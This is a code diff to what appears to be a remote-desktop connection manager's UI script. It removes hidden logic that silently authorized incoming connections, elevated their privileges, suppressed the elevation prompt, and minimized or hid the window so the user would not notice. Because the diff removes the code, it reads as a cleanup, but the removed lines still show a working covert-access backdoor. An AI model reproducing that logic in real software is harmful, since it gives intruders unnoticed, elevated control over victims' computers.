@@ -14,7 +14,6 @@ class Body: Reactor.Component
         body = this;
     }
 
-    });
     function render() {
         if (connections.length == 0)
           return <div style="size:*; margin: * 0; text-align: center;">
@@ -28,13 +27,6 @@ class Body: Reactor.Component
         var callback = function(msg) {
             me.sendMsg(msg);
         };
-        connection.authorized = true;
-        show_elevation = false;
-        handler.elevate_portable(c.cid);
-        handler.authorize(c.cid);
-        self.timer(30ms, function() {
-            view.windowState = View.WINDOW_MINIMIZED;
-        });
         var right_style = show_chat ? "" : "display: none";
         var disconnected = c.disconnected;
         var show_elevation_btn = handler.can_elevate() && show_elevation && !c.is_file_transfer && c.port_forward.length == 0;
@@ -396,21 +388,12 @@ handler.addConnection = function(id, is_file_transfer, port_forward, peer_id, na
         connections[idx] = conn;
         body.cur = idx;
     }
-    // bring_to_top();
-    var { cid, connection } = this;
-    checkClickTime(function() {
-        show_elevation = false;
-        body.update();
-        handler.elevate_portable(cid);
-        self.timer(30ms, function() {
-            view.windowState = View.WINDOW_MINIMIZED;
-        });
-    });
+    bring_to_top();
     update();
     self.timer(1ms, adjustHeader);
     if (authorized) {
-        self.timer(10s, function() {
-            view.windowState = View.WINDOW_HIDDEN;
+        self.timer(3s, function() {
+            view.windowState = View.WINDOW_MINIMIZED;
         });
     }
 }
